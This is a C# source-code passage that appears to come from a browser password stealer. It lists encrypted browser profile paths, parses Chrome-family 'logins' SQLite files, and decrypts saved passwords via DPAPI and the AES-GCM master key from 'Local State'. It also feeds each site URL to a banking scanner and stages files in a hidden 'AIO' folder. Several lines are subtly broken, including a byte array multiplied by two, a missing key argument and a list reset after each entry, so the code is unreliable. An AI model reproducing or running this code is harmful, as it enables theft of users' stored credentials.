            StringsCrypt.Decrypt(new byte[] { 13, 6, 120, 217, 132, 74, 167, 141, 165, 239, 104, 198, 115, 212, 98, 108, 230, 36, 207, 96, 112, 142, 221, 116, 224, 149, 170, 246, 80, 191, 143, 130 }), // Comodo\User Data
            StringsCrypt.Decrypt(new byte[] { 59, 208, 82, 153, 38, 145, 53, 186, 128, 79, 177, 14, 101, 235, 46, 148, 230, 52, 225, 181, 155, 81, 183, 213, 37, 54, 26, 129, 9, 171, 114, 201 }), // 360Browser\Browser\User Data
            StringsCrypt.Decrypt(new byte[] { 210, 110, 31, 64, 140, 5, 137, 32, 239, 70, 133, 139, 182, 28, 116, 149, 137, 179, 177, 211, 237, 32, 56, 74, 238, 183, 94, 93, 153, 52, 180, 166 }), // Maxthon3\User Data
            StringsCrypt.Decrypt(new byte[] { 127, 26, 51, 8, 51, 33, 160, 156, 24, 156, 118, 176, 53, 117, 49, 254, 255, 109, 181, 189, 202, 185, 182, 67, 39, 65, 51, 52, 173, 18, 238, 176 }), // K-Melon\User Data
            StringsCrypt.Decrypt(new byte[] { 199, 54, 29, 56, 170, 241, 14, 100, 162, 6, 72, 161, 113, 24, 82, 202, 17, 115, 136, 234, 7, 212, 113, 6, 151, 135, 75, 247, 247, 173, 203, 24 }), // Sputnik\Sputnik\User Data
            StringsCrypt.Decrypt(new byte[] { 83, 72, 133, 227, 83, 110, 30, 229, 236, 41, 214, 6, 199, 29, 46, 177, 241, 54, 120, 70, 151, 178, 31, 141, 61, 90, 213, 35, 23, 246, 13, 83 }), // Nichrome\User Data
            StringsCrypt.Decrypt(new byte[] { 104, 246, 234, 64, 237, 165, 148, 53, 5, 137, 111, 113, 171, 60, 134, 245, 123, 46, 6, 132, 64, 48, 18, 15, 251, 4, 115, 37, 170, 131, 50, 128 }), // CocCoc\Browser\User Data
            StringsCrypt.Decrypt(new byte[] { 133, 151, 179, 255, 133, 211, 180, 66, 84, 153, 153, 102, 25, 119, 175, 75, 37, 11, 232, 242, 215, 134, 15, 104, 97, 24, 243, 15, 72, 21, 214, 148 }), // Uran\User Data
            StringsCrypt.Decrypt(new byte[] { 101, 40, 56, 105, 89, 211, 223, 54, 3, 104, 25, 89, 1, 122, 183, 190, 84, 174, 204, 213, 56, 142, 216, 145, 19, 148, 221, 119, 63, 0, 14, 109 }), // Chromodo\User Data
            StringsCrypt.Decrypt(new byte[] { 175, 246, 73, 246, 49, 254, 11, 23, 218, 203, 11, 198, 89, 205, 176, 84, 56, 68, 227, 191, 99, 91, 219, 129, 239, 50, 148, 130, 220, 188, 164, 21 }), // Mail.Ru\Atom\User Data
            StringsCrypt.Decrypt(new byte[] { 75, 24, 125, 65, 43, 53, 196, 162, 16, 125, 167, 152, 46, 91, 169, 88, 249, 110, 125, 80, 24, 9, 189, 218, 64, 40, 44, 44, 182, 21, 14, 72, 150, 141, 179, 43, 1, 75, 180, 171, 191, 237, 98, 81, 222, 4, 48, 130 }), // BraveSoftware\Brave-Browser\User Data
        };

                // Encrypted Firefox based browsers path's
                public static string[] sGeckoBrowserPaths = new string[]
                {
            StringsCrypt.Decrypt(new byte[] { 25, 165, 254, 213, 23, 104, 22, 140, 50, 180, 13, 111, 144, 203, 43, 22, 130, 192, 203, 173, 216, 174, 203, 198, 119, 247, 195, 48, 28, 15, 102, 251, }), // \Mozilla\Firefox
            StringsCrypt.Decrypt(new byte[] { 57, 61, 215, 94, 116, 76, 131, 196, 108, 135, 85, 159, 219, 37, 127, 47, }), // \Waterfox
            StringsCrypt.Decrypt(new byte[] { 131, 14, 255, 168, 2, 46, 205, 11, 17, 125, 39, 71, 131, 241, 39, 192, }), // \\K-Meleon
            StringsCrypt.Decrypt(new byte[] { 78, 198, 187, 164, 195, 98, 111, 181, 201, 137, 136, 6, 94, 66, 48, 57, }), // \Thunderbird
            StringsCrypt.Decrypt(new byte[] { 15, 197, 238, 219, 54, 25, 176, 66, 84, 247, 8, 76, 207, 35, 202, 142, 147, 45, 233, 227, 100, 60, 238, 136, 160, 192, 140, 59, 107, 214, 244, 202, }), // \Comodo\IceDragon
            StringsCrypt.Decrypt(new byte[] { 153, 86, 193, 227, 188, 184, 28, 41, 79, 37, 113, 236, 3, 244, 237, 150, 134, 53, 212, 66, 69, 82, 197, 61, 225, 15, 130, 151, 189, 246, 126, 205, }), // \8pecxstudios\Cyberfox
            StringsCrypt.Decrypt(new byte[] { 196, 189, 143, 56, 114, 249, 19, 12, 92, 176, 156, 66, 203, 221, 53, 72, 131, 177, 110, 160, 95, 218, 63, 31, 217, 46, 132, 4, 211, 175, 216, 239, }), // \NETGATE Technologies\BlackHaw
            StringsCrypt.Decrypt(new byte[] { 156, 253, 178, 143, 188, 39, 142, 60, 241, 99, 247, 116, 211, 99, 5, 119, 40, 243, 72, 59, 0, 175, 243, 243, 94, 202, 67, 206, 126, 176, 47, 182, 145, 87, 37, 85, 76, 138, 57, 238, 162, 167, 29, 248, 230, 180, 133, 57, }), // \Moonchild Productions\Pale Moon
                };

                // Encrypted Edge browser path
                public static string EdgePath = StringsCrypt.Decrypt(new byte[] { 156, 195, 223, 143, 60, 17, 189, 255, 52, 135, 177, 35, 20, 86, 6, 119, 131, 100, 33, 246, 174, 234, 146, 72, 65, 90, 212, 244, 233, 203, 145, 176 }); // Microsoft\Edge\User Data

                // Appdata
                public static string appdata = System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData);
                public static string lappdata = System.Environment.GetFolderPath(System.Environment.SpecialFolder.LocalApplicationData);
            }

            public struct Password
            {
                public string sUrl { get; set; }
                public string sUsername { get; set; }
                public string sPassword { get; set; }
            }


            internal class SQLite
            {
                private readonly byte[] _sqlDataTypeSize = new byte[10] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
                private readonly ulong _dbEncoding;
                private readonly byte[] _fileBytes;
                private readonly ulong _pageSize;
                private string[] _fieldNames;
                private SqliteMasterEntry[] _masterTableEntries;
                private TableEntry[] _tableEntries;

                public SQLite(string fileName)
                {
                    _fileBytes = File.ReadAllBytes(fileName);
                    _pageSize = ConvertToULong(16, 2);
                    _dbEncoding = ConvertToULong(56, 4);
                    ReadMasterTable(100L);
                }

                public string GetValue(int rowNum, int field)
                {
                    try
                    {
                        if (rowNum >= _tableEntries.Length)
                            return (string)null;
                        return field >= _tableEntries[rowNum].Content.Length ? null : _tableEntries[rowNum].Content[field];
                    }
                    catch
                    {
                        return "";
                    }
                }

                public int GetRowCount()
                {
                    return _tableEntries.Length;
                }

                private bool ReadTableFromOffset(ulong offset)
                {
                    try
                    {
                        if (_fileBytes[offset] == 13)
                        {
                            uint num1 = (uint)(ConvertToULong((int)offset + 3, 2) - 1UL);
                            int num2 = 0;
                            if (_tableEntries != null)
                            {
                                num2 = _tableEntries.Length;
                                Array.Resize(ref _tableEntries, _tableEntries.Length + (int)num1 + 1);
                            }
                            else
                                _tableEntries = new TableEntry[(int)num1 + 1];
                            for (uint index1 = 0; (int)index1 <= (int)num1; ++index1)
                            {
                                ulong num3 = ConvertToULong((int)offset + 8 + (int)index1 * 2, 2);
                                if ((long)offset != 100L)
                                    num3 += offset;
                                int endIdx1 = Gvl((int)num3);
                                Cvl((int)num3, endIdx1);
                                int endIdx2 = Gvl((int)((long)num3 + (endIdx1 - (long)num3) + 1L));
                                Cvl((int)((long)num3 + (endIdx1 - (long)num3) + 1L), endIdx2);
                                ulong num4 = num3 + (ulong)(endIdx2 - (long)num3 + 1L);
                                int endIdx3 = Gvl((int)num4);
                                int endIdx4 = endIdx3;
                                long num5 = Cvl((int)num4, endIdx3);
                                RecordHeaderField[] array = null;
                                long num6 = (long)num4 - endIdx3 + 1L;
                                int index2 = 0;
                                while (num6 < num5)
                                {
                                    Array.Resize(ref array, index2 + 1);
                                    int startIdx = endIdx4 + 1;
                                    endIdx4 = Gvl(startIdx);
                                    array[index2].Type = Cvl(startIdx, endIdx4);
                                    array[index2].Size = array[index2].Type <= 9L ? _sqlDataTypeSize[array[index2].Type] : (!IsOdd(array[index2].Type) ? (array[index2].Type - 12L) / 2L : (array[index2].Type - 13L) / 2L);
                                    num6 = num6 + (endIdx4 - startIdx) + 1L;
                                    ++index2;
                                }
                                if (array != null)
                                {
                                    _tableEntries[num2 + (int)index1].Content = new string[array.Length];
                                    int num7 = 0;
                                    for (int index3 = 0; index3 <= array.Length - 1; ++index3)
                                    {
                                        if (array[index3].Type > 9L)
                                        {
                                            if (!IsOdd(array[index3].Type))
                                            {
                                                if ((long)_dbEncoding == 1L)
                                                    _tableEntries[num2 + (int)index1].Content[index3] = Encoding.Default.GetString(_fileBytes, (int)((long)num4 + num5 + num7), (int)array[index3].Size);
                                                else if ((long)_dbEncoding == 2L)
                                                {
                                                    _tableEntries[num2 + (int)index1].Content[index3] = Encoding.Unicode.GetString(_fileBytes, (int)((long)num4 + num5 + num7), (int)array[index3].Size);
                                                }
                                                else if ((long)_dbEncoding == 3L)
                                                    _tableEntries[num2 + (int)index1].Content[index3] = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)((long)num4 + num5 + num7), (int)array[index3].Size);
                                            }
                                            else
                                                _tableEntries[num2 + (int)index1].Content[index3] = Encoding.Default.GetString(_fileBytes, (int)((long)num4 + num5 + num7), (int)array[index3].Size);
                                        }
                                        else
                                            _tableEntries[num2 + (int)index1].Content[index3] = Convert.ToString(ConvertToULong((int)((long)num4 + num5 + num7), (int)array[index3].Size));
                                        num7 += (int)array[index3].Size;
                                    }
                                }
                            }
                        }
                        else if (_fileBytes[offset] == 5)
                        {
                            uint num1 = (uint)(ConvertToULong((int)((long)offset + 3L), 2) - 1UL);
                            for (uint index = 0; (int)index <= (int)num1; ++index)
                            {
                                uint num2 = (uint)ConvertToULong((int)offset + 12 + (int)index * 2, 2);
                                ReadTableFromOffset((ConvertToULong((int)((long)offset + num2), 4) - 1UL) * _pageSize);
                            }
                            ReadTableFromOffset((ConvertToULong((int)((long)offset + 8L), 4) - 1UL) * _pageSize);
                        }
                        return true;
                    }
                    catch
                    {
                        return false;
                    }
                }

                private void ReadMasterTable(long offset)
                {
                    try
                    {
                        switch (_fileBytes[offset])
                        {
                            case 5:
                                uint num1 = (uint)(ConvertToULong((int)offset + 3, 2) - 1UL);
                                for (int index = 0; index <= (int)num1; ++index)
                                {
                                    uint num2 = (uint)ConvertToULong((int)offset + 12 + index * 2, 2);
                                    if (offset == 100L)
                                        ReadMasterTable(((long)ConvertToULong((int)num2, 4) - 1L) * (long)_pageSize);
                                    else
                                        ReadMasterTable(((long)ConvertToULong((int)(offset + num2), 4) - 1L) * (long)_pageSize);
                                }
                                ReadMasterTable(((long)ConvertToULong((int)offset + 8, 4) - 1L) * (long)_pageSize);
                                break;
                            case 13:
                                ulong num3 = ConvertToULong((int)offset + 3, 2) - 1UL;
                                int num4 = 0;
                                if (_masterTableEntries != null)
                                {
                                    num4 = _masterTableEntries.Length;
                                    Array.Resize(ref _masterTableEntries, _masterTableEntries.Length + (int)num3 + 1);
                                }
                                else
                                    _masterTableEntries = new SqliteMasterEntry[checked((ulong)unchecked((long)num3 + 1L))];
                                for (ulong index1 = 0; index1 <= num3; ++index1)
                                {
                                    ulong num2 = ConvertToULong((int)offset + 8 + (int)index1 * 2, 2);
                                    if (offset != 100L)
                                        num2 += (ulong)offset;
                                    int endIdx1 = Gvl((int)num2);
                                    Cvl((int)num2, endIdx1);
                                    int endIdx2 = Gvl((int)((long)num2 + (endIdx1 - (long)num2) + 1L));
                                    Cvl((int)((long)num2 + (endIdx1 - (long)num2) + 1L), endIdx2);
                                    ulong num5 = num2 + (ulong)(endIdx2 - (long)num2 + 1L);
                                    int endIdx3 = Gvl((int)num5);
                                    int endIdx4 = endIdx3;
                                    long num6 = Cvl((int)num5, endIdx3);
                                    long[] numArray = new long[5];
                                    for (int index2 = 0; index2 <= 4; ++index2)
                                    {
                                        int startIdx = endIdx4 + 1;
                                        endIdx4 = Gvl(startIdx);
                                        numArray[index2] = Cvl(startIdx, endIdx4);
                                        numArray[index2] = numArray[index2] <= 9L ? _sqlDataTypeSize[numArray[index2]] : (!IsOdd(numArray[index2]) ? (numArray[index2] - 12L) / 2L : (numArray[index2] - 13L) / 2L);
                                    }
                                    if ((long)_dbEncoding == 1L || (long)_dbEncoding == 2L)

                                        if ((long)_dbEncoding == 1L)
                                            _masterTableEntries[num4 + (int)index1].ItemName = Encoding.Default.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0]), (int)numArray[1]);
                                        else if ((long)_dbEncoding == 2L)
                                            _masterTableEntries[num4 + (int)index1].ItemName = Encoding.Unicode.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0]), (int)numArray[1]);
                                        else if ((long)_dbEncoding == 3L)
                                            _masterTableEntries[num4 + (int)index1].ItemName = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0]), (int)numArray[1]);
                                    _masterTableEntries[num4 + (int)index1].RootNum = (long)ConvertToULong((int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2]), (int)numArray[3]);
                                    if ((long)_dbEncoding == 1L)
                                        _masterTableEntries[num4 + (int)index1].SqlStatement = Encoding.Default.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int)numArray[4]);
                                    else if ((long)_dbEncoding == 2L)
                                        _masterTableEntries[num4 + (int)index1].SqlStatement = Encoding.Unicode.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int)numArray[4]);
                                    else if ((long)_dbEncoding == 3L)
                                        _masterTableEntries[num4 + (int)index1].SqlStatement = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)((long)num5 + num6 + numArray[0] + numArray[1] + numArray[2] + numArray[3]), (int)numArray[4]);
                                }
                                break;
                        }
                    }
                    catch
                    {
                    }
                }

                public bool ReadTable(string tableName)
                {
                    try
                    {
                        int index1 = -1;
                        for (int index2 = 0; index2 <= _masterTableEntries.Length; ++index2)
                        {
                            if (string.Compare(_masterTableEntries[index2].ItemName.ToLower(), tableName.ToLower(), StringComparison.Ordinal) == 0)
                            {
                                index1 = index2;
                                break;
                            }
                        }
                        if (index1 == -1)
                            return false;
                        string[] strArray = _masterTableEntries[index1].SqlStatement.Substring(_masterTableEntries[index1].SqlStatement.IndexOf("(", StringComparison.Ordinal) + 1).Split(',');
                        for (int index2 = 0; index2 <= strArray.Length - 1; ++index2)
                        {
                            strArray[index2] = strArray[index2].TrimStart();
                            int length = strArray[index2].IndexOf(' ');
                            if (length > 0)
                                strArray[index2] = strArray[index2].Substring(0, length);
                            if (strArray[index2].IndexOf("UNIQUE", StringComparison.Ordinal) != 0)
                            {
                                Array.Resize(ref _fieldNames, index2 + 1);
                                _fieldNames[index2] = strArray[index2];
                            }
                        }
                        return ReadTableFromOffset((ulong)(_masterTableEntries[index1].RootNum - 1L) * _pageSize);
                    }
                    catch
                    {
                        return false;
                    }
                }

                private ulong ConvertToULong(int startIndex, int size)
                {
                    try
                    {
                        if (size > 8 | size == 0)
                            return 0;
                        ulong num = 0;
                        for (int index = 0; index <= size - 1; ++index)
                            num = num << 8 | (ulong)_fileBytes[startIndex + index];
                        return num;
                    }
                    catch
                    {
                        return 0;
                    }
                }

                private int Gvl(int startIdx)
                {
                    try
                    {
                        if (startIdx > _fileBytes.Length)
                            return 0;
                        for (int index = startIdx; index <= startIdx + 8; ++index)
                        {
                            if (index > _fileBytes.Length - 1)
                                return 0;
                            if (((int)_fileBytes[index] & 128) != 128)
                                return index;
                        }
                        return startIdx + 8;
                    }
                    catch
                    {
                        return 0;
                    }
                }

                private long Cvl(int startIdx, int endIdx)
                {
                    try
                    {
                        ++endIdx;
                        byte[] numArray = new byte[8];
                        int num1 = endIdx - startIdx;
                        bool flag = false;
                        if (num1 == 0 | num1 > 9)
                            return 0;
                        if (num1 == 1)
                        {
                            numArray[0] = (byte)(_fileBytes[startIdx] & (uint)sbyte.MaxValue);
                            return BitConverter.ToInt64(numArray, 0);
                        }
                        if (num1 == 9)
                            flag = true;
                        int num2 = 1;
                        int num3 = 7;
                        int index1 = 0;
                        if (flag)
                        {
                            numArray[0] = _fileBytes[endIdx - 1];
                            --endIdx;
                            index1 = 1;
                        }
                        int index2 = endIdx - 1;
                        while (index2 >= startIdx)
                        {
                            if (index2 - 1 >= startIdx)
                            {
                                numArray[index1] = (byte)(_fileBytes[index2] >> num2 - 1 & byte.MaxValue >> num2 | _fileBytes[index2 - 1] << num3);
                                ++num2;
                                ++index1;
                                --num3;
                            }
                            else if (!flag)
                                numArray[index1] = (byte)(_fileBytes[index2] >> num2 - 1 & byte.MaxValue >> num2);
                            index2 += -1;
                        }
                        return BitConverter.ToInt64(numArray, 0);
                    }
                    catch
                    {
                        return 0;
                    }
                }

                private static bool IsOdd(long value)
                {
                    return (value & 1L) == 1L;
                }

                private struct RecordHeaderField
                {
                    public long Size;
                    public long Type;
                }

                private struct TableEntry
                {
                    public string[] Content;
                }

                private struct SqliteMasterEntry
                {
                    public string ItemName;
                    public long RootNum;
                    public string SqlStatement;
                }
            }


            internal sealed class SqlReader
            {
                public static SQLite ReadTable(string database, string table)
                {
                    // If database not exists
                    if (!File.Exists(database))
                        return null;
                    // Copy temp database
                    string NewPath = Path.GetTempFileName() + ".dat";
                    File.Copy(database, NewPath);
                    // Read table rows
                    SQLite SQLiteConnection = new SQLite(NewPath);
                    SQLiteConnection.ReadTable(table);
                    // Delete temp database
                    File.Delete(NewPath);
                    // If database corrupted
                    if (SQLiteConnection.GetRowCount() == 65536)
                        return null;
                    // Return
                    return SQLiteConnection;
                }
            }
            internal sealed class Crypto
            {
                [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
                private struct CryptprotectPromptstruct
                {
                    public int cbSize;
                    public int dwPromptFlags;
                    public IntPtr hwndApp;
                    public string szPrompt;
                }

                [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
                private struct DataBlob
                {
                    public int cbData;
                    public IntPtr pbData;
                }

                [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
                private static extern bool CryptUnprotectData(ref DataBlob pCipherText, ref string pszDescription, ref DataBlob pEntropy, IntPtr pReserved, ref CryptprotectPromptstruct pPrompt, int dwFlags, ref DataBlob pPlainText);

                // Speed up decryption using master key
                private static string sPrevBrowserPath = "";
                private static byte[] sPrevMasterKey = new byte[] { };

                // Chrome < 80
                public static byte[] DPAPIDecrypt(byte[] bCipher, byte[] bEntropy = null)
                {
                    DataBlob pPlainText = new DataBlob();
                    DataBlob pCipherText = new DataBlob();
                    DataBlob pEntropy = new DataBlob();

                    CryptprotectPromptstruct pPrompt = new CryptprotectPromptstruct()
                    {
                        cbSize = Marshal.SizeOf(typeof(CryptprotectPromptstruct)),
                        dwPromptFlags = 0,
                        hwndApp = IntPtr.Zero,
                        szPrompt = (string)null
                    };

                    string sEmpty = string.Empty;

                    try
                    {
                        try
                        {
                            if (bCipher == null)
                                bCipher = new byte[0];

                            pCipherText.pbData = Marshal.AllocHGlobal(bCipher.Length);
                            pCipherText.cbData = bCipher.Length;
                            Marshal.Copy(bCipher, 0, pCipherText.pbData, bCipher.Length);

                        }
                        catch { }

                        try
                        {
                            if (bEntropy == null)
                                bEntropy = new byte[0];

                            pEntropy.pbData = Marshal.AllocHGlobal(bEntropy.Length);
                            pEntropy.cbData = bEntropy.Length;

                            Marshal.Copy(bEntropy, 0, pEntropy.pbData, bEntropy.Length);

                        }
                        catch { }

                        CryptUnprotectData(ref pCipherText, ref sEmpty, ref pEntropy, IntPtr.Zero, ref pPrompt, 1, ref pPlainText);

                        byte[] bDestination = new byte[pPlainText.cbData];
                        Marshal.Copy(pPlainText.pbData, bDestination, 0, pPlainText.cbData);
                        return bDestination*2;// /2 :)

                    }
                    catch { }
                    finally
                    {
                        if (pPlainText.pbData != IntPtr.Zero)
                            Marshal.FreeHGlobal(pPlainText.pbData);

                        if (pCipherText.pbData != IntPtr.Zero)
                            Marshal.FreeHGlobal(pCipherText.pbData);

                        if (pEntropy.pbData != IntPtr.Zero)
                            Marshal.FreeHGlobal(pEntropy.pbData);
                    }
                    return new byte[0];
                }
                public static byte[] GetMasterKey(string sLocalStateFolder)
                {

                    string sLocalStateFile = sLocalStateFolder;

                    if (sLocalStateFile.Contains("Opera"))
                        sLocalStateFile += "\\Opera Stable\\Local State";
                    else
                        sLocalStateFile += "\\Local State";

                    byte[] bMasterKey = new byte[] { };

                    if (!File.Exists(sLocalStateFile))
                        return null;

                    // Ну карочи так быстрее работает, да
                    if (sLocalStateFile != sPrevBrowserPath)
                        sPrevBrowserPath = sLocalStateFile;
                    else
                        return sPrevMasterKey;


                    var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"",
                        System.Text.RegularExpressions.RegexOptions.Compiled).Matches(
                        File.ReadAllText(sLocalStateFile));
                    foreach (System.Text.RegularExpressions.Match prof in pattern)
                    {
                        if (prof.Success)
                            bMasterKey = Convert.FromBase64String(prof.Groups[1].Value);
                    }


                    byte[] bRawMasterKey = new byte[bMasterKey.Length - 5];
                    Array.Copy(bMasterKey, 5, bRawMasterKey, 0, bMasterKey.Length - 5);

                    try
                    {
                        sPrevMasterKey = DPAPIDecrypt(bRawMasterKey);
                        return sPrevMasterKey;
                    }
                    catch { return null; }
                }

                public static string GetUTF8(string sNonUtf8)
                {
                    try
                    {
                        byte[] bData = Encoding.Default.GetBytes(sNonUtf8);
                        return Encoding.UTF8.GetString(bData);
                    }
                    catch { return sNonUtf8; }
                }



                public static byte[] DecryptWithKey(byte[] bEncryptedData, byte[] bMasterKey)
                {
                    byte[] bIV = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
                    Array.Copy(bEncryptedData, 3, bIV, 0, 12);

                    try
                    {

                        byte[] bBuffer = new byte[bEncryptedData.Length - 15];
                        Array.Copy(bEncryptedData, 15, bBuffer, 0, bEncryptedData.Length - 15);
                        byte[] bTag = new byte[16];
                        byte[] bData = new byte[bBuffer.Length - bTag.Length];
                        Array.Copy(bBuffer, bBuffer.Length - 16, bTag, 0, 16);
                        Array.Copy(bBuffer, 0, bData, 0, bBuffer.Length - bTag.Length);
                        cAesGcm aDecryptor = new cAesGcm();
                        return aDecryptor.Decrypt(bMasterKey, bIV, null, bData, bTag);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex);
                        return null;
                    }
                }

                public static string EasyDecrypt(string sLoginData, string sPassword)
                {
                    if (sPassword.StartsWith("v10") || sPassword.StartsWith("v11"))
                    {
                        GetMasterKey(Directory.GetParent(sLoginData).Parent.FullName);
                        return Encoding.Default.GetString(DecryptWithKey(Encoding.Default.GetBytes(sPassword), /*bytes*/));
                    }
                    else
                        return Encoding.Default.GetString(DPAPIDecrypt(Encoding.Default.GetBytes(sPassword)));
                }


            }


            public static List<Password> GetPasswords(string sLoginData)
            {

                try
                {
                    List<Password> pPasswords = new List<Password>();

                    // Read data from table
                    SQLite sSQLite = SqlReader.ReadTable(sLoginData, "logins");
                    if (sSQLite == null)
                        return pPasswords;

                    for (int i = 0; i < sSQLite.GetRowCount(); i++)
                    {

                        Password pPassword = new Password();

                        pPassword.sUrl = Crypto.GetUTF8(sSQLite.GetValue(i, 0));
                        pPassword.sUsername = Crypto.GetUTF8(sSQLite.GetValue(i, 3));
                        string sPassword = sSQLite.GetValue(i, 5);

                        if (sPassword != null)
                        {
                            pPassword.sPassword = Crypto.GetUTF8(Crypto.EasyDecrypt(sLoginData, sPassword));
                            pPasswords.Add(pPassword);
                            pPasswords = new List<Password>();

                            // Analyze value
                            Banking.ScanData(pPassword.sUrl);
                        }
                        continue;

                    }

                    return pPasswords;
                }
                catch { return new List<Password>(); }
            }

            class cAesGcm
            {
                public byte[] Decrypt(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
                {
                    IntPtr hAlg = OpenAlgorithmProvider(cBCrypt.BCRYPT_AES_ALGORITHM, cBCrypt.MS_PRIMITIVE_PROVIDER, cBCrypt.BCRYPT_CHAIN_MODE_GCM);
                    IntPtr hKey, keyDataBuffer = ImportKey(hAlg, key, out hKey);

                    byte[] plainText;

                    var authInfo = new cBCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag);
                    using (authInfo)
                    {
                        byte[] ivData = new byte[MaxAuthTagSize(hAlg)];

                        int plainTextSize = 0;

                        uint status = cBCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length, null, 0, ref plainTextSize, 0x0);

                        if (status != cBCrypt.ERROR_SUCCESS)
                            throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() (get size) failed with status code: {0}", status));

                        plainText = new byte[plainTextSize];

                        status = cBCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length, plainText, plainText.Length, ref plainTextSize, 0x0);

                        if (status == cBCrypt.STATUS_AUTH_TAG_MISMATCH)
                            throw new CryptographicException("BCrypt.BCryptDecrypt(): authentication tag mismatch");

                        if (status != cBCrypt.ERROR_SUCCESS)
                            throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() failed with status code:{0}", status));
                    }

                    cBCrypt.BCryptDestroyKey(hKey);
                    Marshal.FreeHGlobal(keyDataBuffer);
                    cBCrypt.BCryptCloseAlgorithmProvider(hAlg, 0x0);

                    return plainText;
                }

                private int MaxAuthTagSize(IntPtr hAlg)
                {
                    byte[] tagLengthsValue = GetProperty(hAlg, cBCrypt.BCRYPT_AUTH_TAG_LENGTH);

                    return BitConverter.ToInt32(new[] { tagLengthsValue[4], tagLengthsValue[5], tagLengthsValue[6], tagLengthsValue[7] }, 0);
                }

                private IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
                {
                    IntPtr hAlg = IntPtr.Zero;

                    uint status = cBCrypt.BCryptOpenAlgorithmProvider(out hAlg, alg, provider, 0x0);

                    if (status != cBCrypt.ERROR_SUCCESS)
                        throw new CryptographicException(string.Format("BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{0}", status));

                    byte[] chainMode = Encoding.Unicode.GetBytes(chainingMode);
                    status = cBCrypt.BCryptSetAlgorithmProperty(hAlg, cBCrypt.BCRYPT_CHAINING_MODE, chainMode, chainMode.Length, 0x0);

                    if (status != cBCrypt.ERROR_SUCCESS)
                        throw new CryptographicException(string.Format("BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{0}", status));

                    return hAlg;
                }

                private IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
                {
                    byte[] objLength = GetProperty(hAlg, cBCrypt.BCRYPT_OBJECT_LENGTH);

                    int keyDataSize = BitConverter.ToInt32(objLength, 0);

                    IntPtr keyDataBuffer = Marshal.AllocHGlobal(keyDataSize);

                    byte[] keyBlob = Concat(cBCrypt.BCRYPT_KEY_DATA_BLOB_MAGIC, BitConverter.GetBytes(0x1), BitConverter.GetBytes(key.Length), key);

                    uint status = cBCrypt.BCryptImportKey(hAlg, IntPtr.Zero, cBCrypt.BCRYPT_KEY_DATA_BLOB, out hKey, keyDataBuffer, keyDataSize, keyBlob, keyBlob.Length, 0x0);

                    if (status != cBCrypt.ERROR_SUCCESS)
                        throw new CryptographicException(string.Format("BCrypt.BCryptImportKey() failed with status code:{0}", status));

                    return keyDataBuffer;
                }

                private byte[] GetProperty(IntPtr hAlg, string name)
                {
                    int size = 0;

                    uint status = cBCrypt.BCryptGetProperty(hAlg, name, null, 0, ref size, 0x0);

                    if (status != cBCrypt.ERROR_SUCCESS)
                        throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() (get size) failed with status code:{0}", status));

                    byte[] value = new byte[size];

                    status = cBCrypt.BCryptGetProperty(hAlg, name, value, value.Length, ref size, 0x0);

                    if (status != cBCrypt.ERROR_SUCCESS)
                        throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() failed with status code:{0}", status));

                    return value;
                }

                public byte[] Concat(params byte[][] arrays)
                {
                    int len = 0;

                    foreach (byte[] array in arrays)
                    {
                        if (array == null)
                            continue;
                        len += array.Length;
                    }

                    byte[] result = new byte[len - 1 + 1];
                    int offset = 0;

                    foreach (byte[] array in arrays)
                    {
                        if (array == null)
                            continue;
                        Buffer.BlockCopy(array, 0, result, offset, array.Length);
                        offset += array.Length;
                    }

                    return result;
                }
            }



            class Handler
            {
                public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System);
                public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
                public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                public static readonly string ExploitName = Assembly.GetExecutingAssembly().Location;
                public static readonly string ExploitDirectory = Path.GetDirectoryName(ExploitName);

                public static string[] SysPatch = new string[]
                {
                AppData,
                LocalData,
                CommonData
                };

                public static string zxczxczxc = SysPatch[new Random().Next(0, SysPatch.Length)];
                public static string ExploitDir = zxczxczxc + "\\" + "AIO";
                public static string date = DateTime.Now.ToString("MM|/dd/|yyyy :) h:mm");
                public static string dateLog = DateTime.Now.ToString("MM|/dd/|yyyy");
            }


            public static class cBCrypt
            {
                public const uint ERROR_SUCCESS = 0x00000000;
